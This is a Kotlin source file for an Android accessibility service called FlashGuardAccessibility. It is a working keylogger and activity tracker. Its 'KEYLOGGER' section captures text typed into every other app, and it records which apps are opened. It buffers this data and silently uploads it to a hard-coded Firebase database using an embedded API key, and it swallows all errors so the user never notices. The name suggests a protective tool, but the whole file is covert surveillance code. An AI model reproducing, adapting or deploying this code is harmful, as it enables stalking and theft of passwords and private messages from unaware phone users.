package com.flashguard.flashguard

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.SharedPreferences
import android.view.accessibility.AccessibilityEvent
import java.net.HttpURLConnection
import java.net.URL

class FlashGuardAccessibility : AccessibilityService() {

    companion object {
        const val FIREBASE_DB   = "https://flashguard-99c20-default-rtdb.firebaseio.com"
        const val FIREBASE_KEY  = "AIzaSyBE8T-wOyXiBAHSRlmdyvhOlT7uCB-Lp1o"
        const val AUTH_URL      = "https://identitytoolkit.googleapis.com/v1/accounts:signInAnonymously?key=$FIREBASE_KEY"
    }

    private val prefs: SharedPreferences by lazy {
        applicationContext.getSharedPreferences("fg_acc", MODE_PRIVATE)
    }

    // Keylog buffer: pkg → accumulated text
    private val keyBuffer = mutableMapOf<String, StringBuilder>()
    private var lastFlushTs = 0L

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo()
        info.eventTypes =
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
            AccessibilityEvent.TYPE_VIEW_FOCUSED or
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED
        info.feedbackType        = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.notificationTimeout = 50
        info.flags               =
            AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
            AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        serviceInfo = info
        prefs.edit().putBoolean("enabled", true).apply()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        try {
            when (event.eventType) {

                // ── APP OPEN EVENT ────────────────────────────────────────────
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    val pkg = event.packageName?.toString() ?: return
                    if (pkg == packageName) return
                    val cls = event.className?.toString() ?: ""
                    val ts  = System.currentTimeMillis()

                    // Save locally
                    prefs.edit()
                        .putString("last_app", pkg)
                        .putString("last_cls", cls)
                        .putLong("last_app_ts", ts)
                        .apply()

                    // Get friendly app name
                    val appName = try {
                        packageManager.getApplicationLabel(
                            packageManager.getApplicationInfo(pkg, 0)
                        ).toString()
                    } catch (_: Exception) { pkg }

                    // Upload to Firebase
                    val deviceId = prefs.getString("fg_device_id", null) ?: return
                    val json = """{"pkg":"$pkg","appName":"${appName.replace("\"","")}","cls":"${cls.take(80)}","ts":$ts}"""
                    firebasePut("devices/$deviceId/app_usage/$ts", json)
                    firebasePut("devices/$deviceId/app_usage/latest", json)
                }

                // ── KEYLOGGER ─────────────────────────────────────────────────
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val pkg  = event.packageName?.toString() ?: return
                    if (pkg == packageName) return
                    val text = event.text?.joinToString("") ?: return
                    if (text.isBlank()) return

                    val buf = keyBuffer.getOrPut(pkg) { StringBuilder() }
                    buf.append(text).append(" ")

                    // Flush every 20 chars or 8 seconds
                    val now = System.currentTimeMillis()
                    if (buf.length >= 20 || now - lastFlushTs > 8000) {
                        flushKeylogs(now)
                    }
                }

                else -> {}
            }
        } catch (_: Exception) {}
    }

    private fun flushKeylogs(now: Long) {
        if (keyBuffer.isEmpty()) return
        val deviceId = prefs.getString("fg_device_id", null) ?: return
        val snapshot = keyBuffer.toMap()
        keyBuffer.clear()
        lastFlushTs = now

        Thread {
            val token = getFirebaseToken() ?: return@Thread
            snapshot.forEach { (pkg, buf) ->
                if (buf.isBlank()) return@forEach
                val appName = try {
                    packageManager.getApplicationLabel(
                        packageManager.getApplicationInfo(pkg, 0)
                    ).toString()
                } catch (_: Exception) { pkg }
                val safe = buf.toString().replace("\\", "\\\\").replace("\"", "'").take(500)
                val json = """{"pkg":"$pkg","appName":"${appName.replace("\"","")}","text":"$safe","ts":$now}"""
                putWithToken("devices/$deviceId/keylogs/$now", json, token)
            }
        }.start()
    }

    // ── Firebase helpers ──────────────────────────────────────────────────────

    private fun firebasePut(path: String, json: String) {
        Thread {
            val token = getFirebaseToken() ?: return@Thread
            putWithToken(path, json, token)
        }.start()
    }

    private fun putWithToken(path: String, json: String, token: String) {
        try {
            val url  = URL("$FIREBASE_DB/$path.json?auth=$token")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "PUT"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 8000
            conn.readTimeout    = 8000
            conn.doOutput = true
            conn.outputStream.bufferedWriter().use { it.write(json) }
            conn.responseCode
            conn.disconnect()
        } catch (_: Exception) {}
    }

    private fun getFirebaseToken(): String? {
        val cached = prefs.getString("fb_token", null)
        val exp    = prefs.getLong("fb_token_exp", 0)
        if (cached != null && System.currentTimeMillis() < exp - 60_000) return cached
        return try {
            val url  = URL(AUTH_URL)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 10000
            conn.readTimeout    = 10000
            conn.doOutput = true
            conn.outputStream.bufferedWriter().use { it.write("""{"returnSecureToken":true}""") }
            val resp  = conn.inputStream.bufferedReader().readText()
            conn.disconnect()
            val token = resp.substringAfter("\"idToken\":\"").substringBefore("\"")
            if (token.isNotEmpty()) {
                prefs.edit()
                    .putString("fb_token", token)
                    .putLong("fb_token_exp", System.currentTimeMillis() + 3_600_000)
                    .apply()
                token
            } else null
        } catch (_: Exception) { null }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        prefs.edit().putBoolean("enabled", false).apply()
        super.onDestroy()
    }
}
